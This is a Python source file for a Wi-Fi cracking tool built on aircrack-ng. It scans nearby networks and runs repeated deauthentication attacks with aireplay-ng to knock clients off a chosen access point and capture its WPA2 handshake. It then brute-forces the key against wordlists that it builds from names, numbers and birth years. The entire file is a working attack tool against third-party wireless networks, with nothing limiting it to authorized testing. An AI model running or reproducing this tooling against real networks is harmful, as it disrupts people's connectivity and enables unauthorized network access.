import os
import re
from os import path
import signal
import subprocess
import time
import sys

class crackwifi():
    def __init__(self, password):
        self.password = password

    def check_wifi_compatibility(self):
        """Check if wireless card supports monitor mode"""
        
        # Use subprocess to capture output directly
        try:
            # Option 1: If you have passwordless sudo configured
            result = subprocess.run(
                ["sudo","-S", "airmon-ng"],
                input = self.password + "\n",
                capture_output=True,
                text=True,
                
            )
            test_results = result.stdout

        except subprocess.TimeoutExpired:
            print("Command timed out - check sudo permissions")
            return
        except FileNotFoundError:
            print("airmon-ng not found. Install aircrack-ng first")
            return
        except Exception as e:
            print(f"Error running airmon-ng: {e}")
            return
        
        print(test_results)
        
        # Check for wireless interfaces
        if 'wlan' not in test_results and 'wl' not in test_results:
            print("Your computer does not support network monitoring mode")
            return
        else:
            # Find available wireless interfaces
            for line in test_results.split('\n'):
                if 'wlan' in line or 'wl' in line:
                    print(f"Found wireless interface: {line.strip()}")
        
        print('You passed - wireless interface detected')
        return True

    def starting_monitor_mode(self):
        #kill all wifi running processes
        #sudo airmon-ng check kill
        result = subprocess.run(['sudo','-S','airmon-ng','check','kill'],
                    input=self.password + "\n",
                    capture_output=True,
                    text = True,
                    timeout=10)
        results = result.stdout
        if result.returncode != 0:
            print(f'❌ Failed to kill processes: {result.stderr}')
            return False
            
        print('✅ Processes killed!')
        print(result.stdout)

        #starting monitor 
        result = subprocess.run(['sudo','-S','airmon-ng','start','wlan0'],
                                input=self.password + "\n",
                                capture_output=True,
                                text=True,
                                timeout=10)
        if result.returncode in [0,-2]:
            results = result.stdout
            print(results)
            print('8'*40)
            if 'enabled' not in results.lower() or 'monitor mode' not in results.lower() or 'chipset' not in results.lower():
                print('failed to enable the monitor mode although the it ran')
                return
            print('monitor mode enabled successfully')


        else:
            print(results)
            print('command failed')

    def get_target(self, scan_time=30):
        """Scan for WiFi targets using airodump-ng"""
        import csv
        import io
        
        check = subprocess.run(
            ['iwconfig', 'wlan0mon'],
            capture_output=True,
            text=True
        )
        
        if 'No such device' in check.stderr or 'wlan0mon' not in check.stdout:
            print('❌ Interface wlan0mon does not exist!')
            print(f"Available interfaces:\n{check.stdout}")
            return {}
        
        print(f"Interface confirmed: wlan0mon exists")
        

        print(f"\n[*] Scanning for WiFi networks ({scan_time} seconds)...")
        
        try:
            # Remove old scan files first
            import glob
            old_files = glob.glob("/home/superkevin35/Desktop/projects/WIFI Cracking/scan-01.*")
            for old_file in old_files:
                try:
                    os.remove(old_file)
                    print(f"Removed old file: {old_file}")
                except:
                    pass
            
            command = f"""
            echo '{self.password}' | sudo -S airodump-ng wlan0mon \
            -w "/home/superkevin35/Desktop/projects/WIFI Cracking/scan" \
            --output-format csv
            """

            # Use Popen for long-running process
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid
            )
            
            # Let it run for specified time
            time.sleep(scan_time)
            
            # Send SIGINT to save properly
            os.killpg(os.getpgid(process.pid), signal.SIGINT)
            time.sleep(3)  # Give it time to write output
            
            try:
                stdout, stderr = process.communicate(timeout=5)
            except:
                process.kill()
                stdout, stderr = process.communicate()
                
        except Exception as e:
            print(f"Error during scanning: {e}")
            return {}
        
        captured_wifi = {}
        print("\n=== Found Networks ===")
        file_path = "/home/superkevin35/Desktop/projects/WIFI Cracking/scan-01.csv"
        if not os.path.exists(file_path):
            print(f"❌ Output file not found: {file_path}")
            print("Checking for any CSV files...")
            import glob
            csv_files = glob.glob("/home/superkevin35/Desktop/projects/WIFI Cracking/scan*.csv")
            if csv_files:
                file_path = csv_files[0]
                print(f"Found: {file_path}")
            else:
                return {}
        
        # Parse CSV properly
        network_count = 0
        
        with open(file_path, 'r') as f:
            # Read all lines and find where network section starts
            lines = f.readlines()
        
        # Find the network header line
        header_line = None
        data_start = 0
        
        for i, line in enumerate(lines):
            if 'BSSID' in line and 'ESSID' in line and 'channel' in line:
                header_line = line.strip()
                data_start = i + 1
                break
        
        if header_line is None:
            print("Could not find network header!")
            return {}
        
        # Parse CSV header
        headers = header_line.split(',')
        headers = [h.strip() for h in headers]
        
        print(f"Headers: {headers}")
        
        # Find column indices
        bssid_col = headers.index('BSSID') if 'BSSID' in headers else 0
        channel_col = headers.index('channel') if 'channel' in headers else 3
        essid_col = headers.index('ESSID') if 'ESSID' in headers else 13
        
        print(f"Columns - BSSID:{bssid_col}, Channel:{channel_col}, ESSID:{essid_col}")
        
        # Parse data lines
        for line in lines[data_start:]:
            line = line.strip()
            
            if not line:
                continue
            
            # Stop at client section
            if 'Station MAC' in line:
                break
            
            # Parse CSV line
            parts = line.split(',')
            
            if len(parts) < 14:
                continue
            
            bssid = parts[bssid_col].strip() if bssid_col < len(parts) else ''
            
            # Validate BSSID
            if not bssid or len(bssid) < 17 or 'BSSID' in bssid:
                continue
            
            if bssid.count(':') != 5 and bssid.count('-') != 5:
                continue
            
            # Extract fields
            channel = parts[channel_col].strip() if channel_col < len(parts) else 'Unknown'
            essid = parts[essid_col].strip() if essid_col < len(parts) else ''
            
            if not essid:
                essid = '<Hidden>'
            
            network_count += 1
            name = f'wifi{network_count}'
            
            captured_wifi[name] = {
                'bssid': bssid,
                'essid': essid,
                'channel': channel
            }
            
            print(f"  {name}: BSSID={bssid}, ESSID={essid}, Channel={channel}")
        
        print(f"\nFound {len(captured_wifi)} networks")
        return captured_wifi

    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output file"""
        import csv
        
        networks = {}
        count = 0
        
        try:
            with open(csv_file, 'r') as f:
                # Skip empty lines at start
                lines = f.readlines()
                
            # Find the network section
            in_network_section = False
            
            for line in lines:
                line = line.strip()
                
                if not line:
                    continue
                
                # Detect the network header
                if 'BSSID' in line and 'ESSID' in line and 'channel' in line:
                    in_network_section = True
                    continue
                
                # Stop at client section
                if 'Station MAC' in line:
                    break
                
                if not in_network_section:
                    continue
                
                # Parse CSV line
                parts = line.split(',')
                if len(parts) < 14:
                    continue
                
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                
                # Skip empty BSSID or header lines
                if not bssid or 'BSSID' in bssid:
                    continue
                
                count += 1
                networks[f'wifi{count}'] = {
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid if essid else '<Hidden>'
                }
                
                print(f"  WiFi{count}: BSSID={bssid}, CH={channel}, ESSID={essid if essid else '<Hidden>'}")
                
        except Exception as e:
            print(f"Error parsing CSV: {e}")
        
        return networks

    def get_target_visible_terminal(self, scan_time=30):
        """Open airodump-ng in visible terminal, save to file, then parse"""
        
        print(f"\n[*] Opening airodump-ng in new terminal for {scan_time} seconds...")
        print("[*] Close the terminal when you're done, or it will close automatically")
        
        # Create temp file for output
        output_file = "/tmp/airodump_scan"
        
        # ✅ FIXED: Remove old scan files using sudo
        for f in [f"{output_file}-01.csv", f"{output_file}-01.cap", 
                f"{output_file}-01.kismet.csv", f"{output_file}-01.kismet.netxml"]:
            if os.path.exists(f):
                try:
                    os.remove(f)  # Try as normal user first
                except PermissionError:
                    # If failed, use sudo to remove
                    subprocess.run(['sudo', '-S', 'rm', '-f', f], 
                                input=self.password + '\n',
                                capture_output=True,
                                text=True)
        
        # Command to run in the terminal
        cmd = f"echo '{self.password}' | sudo -S airodump-ng wlan0mon -w {output_file} --output-format csv"

        # Open in gnome-terminal
        process = subprocess.Popen(
            ['gnome-terminal', '--', 'bash', '-c', 
            f'{cmd}; exec bash'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        print(f"[*] Terminal opened! Scanning for {scan_time} seconds...")
        print("[*] You can watch the scan in the terminal window")
        
        # Wait for scan duration
        time.sleep(scan_time)
        
        # Kill the airodump-ng process (not the terminal)
        subprocess.run(['sudo', '-S', 'pkill', 'airodump-ng'], 
                    input=self.password + '\n', 
                    capture_output=True,
                    text = True)
        
        # Wait for file to be written
        time.sleep(2)
        
        # Read the CSV output file
        csv_file = f"{output_file}-01.csv"
        
        if not os.path.exists(csv_file):
            print(f"❌ Output file not found: {csv_file}")
            return {}
        
        print(f"[*] Reading scan results from {csv_file}")
        
        # Parse CSV file
        networks = self.parse_airodump_csv(csv_file)
        
        return networks

    
    def stop_monitor_mode(self):
        #stopping monitor mode and making everything normal 
        result = subprocess.run(['sudo','-S','airmon-ng','stop','wlan0mon'],
                                input=self.password + '\n',
                                capture_output=True,
                                text = True,
                                timeout=10
                                )
        if result.returncode != 0:
            print('Failed to turn off monitor mode')
            return
        print('monitor mode off')

        #resolve services
        try:
            result1 = subprocess.run(['sudo','-S','service','NetworkManager','restart'],
                                    input = self.password + '\n',
                                    capture_output=True,
                                    text = True,
                                    timeout = 10
                                    )
            
            result2 = subprocess.run(['sudo','-S','service','wpa_supplicant','restart'],
                                    input = self.password + '\n',
                                    capture_output=True,
                                    text = True,
                                    timeout=10
                                    )
            if result1.returncode != 0 or result2.returncode != 0:
                print('command failed ')
                return
            print('successfully enabled services')
        except subprocess.TimeoutExpired:
            print('the command timed out')
        except FileNotFoundError:
            print('command not found - check if services exist')
        except Exception as e:
            print('failed to start services , please reboot your computer')


    def get_handshake(self, bssid, channel, essid, number):
        """
        Properly captures WPA2 handshake with correct process sequencing
        """
        try:
            wdir = os.path.join(os.getcwd(), 'handshakes')
            os.makedirs(wdir, exist_ok=True)
            output_file = os.path.join(wdir, "capture")
            
            # Step 1: Set the channel on wlan0mon
            print(f"[*] Setting channel {channel} on wlan0mon...")
            subprocess.run(
                ['sudo', '-S', 'iwconfig', 'wlan0mon', 'channel', str(channel)],
                input=self.password + '\n',
                capture_output=True,
                text=True,
                timeout=10
            )
            time.sleep(2)
            
            # Step 2: Start airodump-ng FIRST (the packet capture)
            print(f"[*] Starting airodump-ng on {bssid}...")
            airodump_cmd = [
                'sudo', '-S', 'airodump-ng',
                '--bssid', bssid.strip(),
                '-c', str(channel),
                '-w', output_file,
                '--write-interval', '1',
                'wlan0mon'
            ]
            
            process1 = subprocess.Popen(
                airodump_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Pass password to airodump's sudo
            try:
                process1.stdin.write(self.password + '\n')
                process1.stdin.flush()
            except:
                pass
            
            # Step 3: Wait for airodump to initialize
            print("[*] Waiting for airodump to initialize...")
            time.sleep(4)
            
            # Step 4: Send MULTIPLE rounds of deauth attacks
            print(f"[*] Starting deauth attacks ({number} packets per round, 3 rounds)...")
            
            for round_num in range(1, 4):  # 3 rounds of deauth
                print(f"[*] Deauth round {round_num}/3...")
                
                deauth_cmd = [
                    'sudo', '-S', 'aireplay-ng',
                    '-0', str(number),
                    '-a', bssid.strip(),
                    'wlan0mon'
                ]
                
                process2 = subprocess.Popen(
                    deauth_cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                # Pass password
                try:
                    process2.stdin.write(self.password + '\n')
                    process2.stdin.flush()
                    process2.stdin.close()
                except:
                    pass
                
                # Wait for this round to complete
                try:
                    process2.wait(timeout=30)
                    print(f"[+] Round {round_num} completed")
                except subprocess.TimeoutExpired:
                    process2.kill()
                    print(f"[-] Round {round_num} timeout")
                
                # Wait between rounds
                if round_num < 3:
                    print("[*] Waiting 5 seconds before next round...")
                    time.sleep(5)
            
            # Step 5: Continue capturing after deauth attacks
            print("[*] Continuing capture for 20 more seconds...")
            time.sleep(20)
            
            # Step 6: Terminate airodump gracefully
            print("[*] Stopping capture...")
            process1.send_signal(signal.SIGTERM)
            time.sleep(3)
            
            # If still running, force kill
            if process1.poll() is None:
                process1.kill()
                time.sleep(2)
            
            # Step 7: Check if handshake was captured
            print("[*] Checking for handshake...")
            cap_file = output_file + '-01.cap'
            
            if os.path.exists(cap_file):
                file_size = os.path.getsize(cap_file)
                print(f"[+] Capture file found: {file_size} bytes")
                
                if file_size > 10000:  # At least 10KB
                    # Use aircrack-ng to verify handshake
                    try:
                        result = subprocess.run(
                            ['aircrack-ng', cap_file],  # No sudo needed for checking
                            capture_output=True,
                            text=True,
                            timeout=15
                        )
                        
                        output = result.stdout + result.stderr
                        print(f"[*] Aircrack analysis:\n{output}")
                        
                        # Check for handshake indicators
                        if 'handshake' in output.lower() or 'WPA (1 handshake)' in output:
                            print("[+] ✓ HANDSHAKE CAPTURED SUCCESSFULLY!")
                            print('validating handshake file...')

                    
                            if 'WPA (1 handshake)' in output or '1 handshake' in output:
                                print("[+] ✓ Handshake file is valid and contains 1 handshake")
                                return True
                            
                            subprocess.run(['sudo','-S','rm','-rf','handshakes'],
                                            input = self.password + '\n',
                                            capture_output=True,
                                            text = True,
                                            timeout=3
                            )
                            print('failed to validate handshake file, removing capture file and returning false')
                            return False
                        elif '0 handshake' in output:
                            print("[-] No handshake found - no clients connected or deauth failed")
                            print("[*] Try:")
                            print("    - Increase deauth packets (try 50-100)")
                            print("    - Make sure clients are connected to the network")
                            print("    - Move closer to the target")
                            return False
                        else:
                            print(f"[-] Unknown result: {output[:300]}")
                            return False
                            
                    except Exception as e:
                        print(f"[-] Error verifying handshake: {e}")
                        return False
                else:
                    print(f"[-] Capture file too small ({file_size} bytes)")
                    return False
            else:
                print(f"[-] Capture file not found: {cap_file}")
                if os.path.exists(wdir):
                    print(f"Files in {wdir}: {os.listdir(wdir)}")
                return False
                
        except subprocess.TimeoutExpired:
            print("[-] Process timeout")
            return False
        except PermissionError:
            print("[-] Permission denied")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            import traceback
            traceback.print_exc()
            return False


    def crack_handshake(self, wordlist_path, cap_file, progress_callback=None):
        #Crack WPA handshake using aircrack-ng with wordlist
        # progress_callback: optional function called with {"status": "progress", "message": ..., "progress": ...}
        
        command = ['sudo', '-S', 'aircrack-ng', '-w', wordlist_path, cap_file]
        
        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        process.stdin.write(self.password + '\n')
        process.stdin.flush()
        
        last_line = ""
        percentage = "0%"
        password_found = None
        last_progress_time = time.time()
        
        try:
            for line in process.stdout:
                line = line.strip()
                print(line)
                last_line = line
                
                # Extract percentage progress
                percent_match = re.search(r'(\d+\.?\d*%)', line)
                if percent_match:
                    percentage = percent_match.group(1)
                
                # Check if key found - SEND TO UI IMMEDIATELY, then break
                if "KEY FOUND" in line:
                    key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                    if key_match:
                        password_found = key_match.group(1)
                        
                        # Tell UI immediately that password was found
                        if progress_callback:
                            progress_callback({
                                "status": "progress",
                                "message": f"KEY FOUND: {password_found}",
                                "progress": "100%",
                                "password": password_found
                            })
                    break
                
                # Send progress to UI every 5 seconds
                current_time = time.time()
                if progress_callback and (current_time - last_progress_time) >= 5:
                    progress_callback({
                        "status": "progress",
                        "message": f"Cracking... {percentage}",
                        "progress": percentage
                    })
                    last_progress_time = current_time
                        
        except KeyboardInterrupt:
            process.terminate()
        
        process.wait()
        
        # Clean up
        try:
            subprocess.run(['sudo','-S','rm','-rf','handshake'],
                            input=self.password + '\n',
                            capture_output=True,
                            text=True,
                            timeout=3)
        except:
            pass
        
        # Return ORIGINAL format
        return {
            'password': password_found,
            'progress': percentage,
            'last_line': last_line
        }

    def create_wordlist(self, name='admin', opt=None, numbers=False):

        # Create wordlist directory
        wordlist_dir = os.path.join(os.getcwd(), 'wordlists')
        os.makedirs(wordlist_dir, exist_ok=True)
        
        # Generate filename
        filename = f"wordlist_{name}"
        if opt:
            # Clean opt for filename (remove unsafe characters)
            clean_opt = opt.replace('/', '_').replace('\\', '_').replace(' ', '')
            filename += f"_opt_{clean_opt}"
        if numbers:
            filename += "_num"
        filename += ".txt"
        
        wordlist_path = os.path.join(wordlist_dir, filename)
        
        print(f"[*] Creating wordlist: {filename}")
        print(f"    Name: {name}")
        print(f"    Operator(s): {opt if opt else 'None'}")
        print(f"    Numbers: {numbers}")
        
        wordlist = set()  # Use set to avoid duplicates
        
        # If opt is provided, split into individual characters
        # e.g., '@#$' → ['@', '#', '$']
        operators = list(opt) if opt else []
        
        # ============================================================
        # Determine number range
        # ============================================================
        name_is_number = name.isdigit()
        user_number = int(name) if name_is_number else 0
        
        number_list = []
        
        if name_is_number:
            if user_number <= 10000:
                # Count from user's number up to 10000
                for num in range(user_number, 10001):
                    number_list.append(num)
                
                print(f"    Number range: {user_number} to 10000")
            else:
                # Number exceeds 10000, just use that number
                number_list.append(user_number)
                print(f"    Number range: {user_number} only (exceeds 10000)")
        elif numbers:
            # User entered a word, generate numbers 0 to 9999
            for num in range(0, 10000):
                number_list.append(num)
            
            # Add common patterns
            extra_nums = [111, 222, 333, 444, 555, 666, 777, 888, 999,
                        1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999,
                        123, 1234, 12345, 123456, 1234567, 12345678]
            number_list.extend(extra_nums)
            
            # Add birth years
            for year in range(1970, 2026):
                number_list.append(year)
            
            print(f"    Number range: 0 to 9999 + common patterns")
        
        # Remove duplicates
        number_list = list(dict.fromkeys(number_list))
        print(f"    Total unique numbers: {len(number_list)}")
        
        # ============================================================
        # CASE 1: User enters a number as name (e.g., '1234', '44')
        # ============================================================
        if name_is_number:
            # Add base numbers
            for num in number_list:
                num_str = str(num)
                wordlist.add(num_str)
                wordlist.add(f"{num:04d}")  # 0044
                wordlist.add(f"{num:06d}")  # 000044
            
            # If operator is provided: number + operator + number
            if operators:
                for op in operators:
                    # number + operator → 1234@
                    for num_str in list(wordlist)[:100]:
                        wordlist.add(f"{num_str}{op}")      # 1234@
                        wordlist.add(f"{op}{num_str}")      # @1234
                    
                    if numbers:
                        # number + operator + number → 44@45, 44@46, ... 44@10000
                        base_num = user_number
                        for next_num in range(base_num + 1, min(base_num + 1001, 10001)):
                            wordlist.add(f"{base_num}{op}{next_num}")  # 44@45
            
            # number + common words
            common_words = ['admin', 'password', 'wifi', 'router', 'internet', 
                        'pass', 'key', 'net', 'home', 'guest']
            for num_str in list(wordlist)[:50]:
                for word in common_words:
                    wordlist.add(f"{num_str}{word}")     # 1234admin
                    wordlist.add(f"{word}{num_str}")     # admin1234
                    if operators:
                        for op in operators[:2]:
                            wordlist.add(f"{num_str}{op}{word}")    # 1234@admin
                            wordlist.add(f"{word}{op}{num_str}")    # admin@1234
        
        # ============================================================
        # CASE 2: User enters a word as name (e.g., 'kevin')
        # ============================================================
        else:
            # Base variations of the name
            name_variations = [name, name.lower(), name.upper(), name.capitalize()]
            
            for nv in name_variations:
                # Add the base name
                wordlist.add(nv)
                wordlist.add(nv * 2)  # kevinkevin
                
                # If operator provided: name + operator
                if operators:
                    for op in operators:
                        wordlist.add(f"{nv}{op}")        # kevin@
                        wordlist.add(f"{op}{nv}")        # @kevin
                        wordlist.add(f"{nv}{op}{op}")    # kevin@@
                
                if numbers and not operators:
                    # FORMAT: name + number → kevin44, kevin123
                    for num in number_list:
                        wordlist.add(f"{nv}{num}")        # kevin44
                
                if numbers and operators:
                    # FORMAT: name + operator + number → kevin@44
                    for op in operators:
                        # Use subset for large number lists to avoid huge files
                        sample_nums = number_list[:500] if len(number_list) > 500 else number_list
                        for num in sample_nums:
                            wordlist.add(f"{nv}{op}{num}")     # kevin@44
                            wordlist.add(f"{nv}{num}{op}")     # kevin44@
                            wordlist.add(f"{op}{nv}{num}")     # @kevin44
                            wordlist.add(f"{num}{op}{nv}")     # 44@kevin
        
        # ============================================================
        # Add common password patterns
        # ============================================================
        common_passwords = [
            'password', '12345678', '123456789', 'qwerty123',
            'admin123', 'wifi123', 'internet', 'letmein', 
            'welcome1', 'changeme', 'password1', 'password123',
        ]
        
        # Only add these if no operator specified (to keep wordlist focused)
        if not operators:
            wordlist.update(common_passwords)
        
        # ============================================================
        # Filter: Only keep passwords 8 characters or longer (WPA minimum)
        # ============================================================
        filtered_wordlist = {w for w in wordlist if len(w) >= 8}
        
        # Remove empty entries
        filtered_wordlist = {w.strip() for w in filtered_wordlist if w.strip()}
        
        # Sort alphabetically
        sorted_wordlist = sorted(filtered_wordlist)
        
        # Write to file
        with open(wordlist_path, 'w') as f:
            for word in sorted_wordlist:
                f.write(word + '\n')
        
        file_size = os.path.getsize(wordlist_path)
        print(f"\n[+] Wordlist created successfully!")
        print(f"[+] Path: {wordlist_path}")
        print(f"[+] Total passwords: {len(sorted_wordlist)}")
        print(f"[+] File size: {file_size:,} bytes ({file_size/1024:.1f} KB)")
        
        # Show sample passwords
        if sorted_wordlist:
            print(f"\n[*] Sample passwords:")
            import random
            samples = random.sample(sorted_wordlist, min(10, len(sorted_wordlist)))
            for s in sorted(samples):
                print(f"    {s}")
        
        return wordlist_path        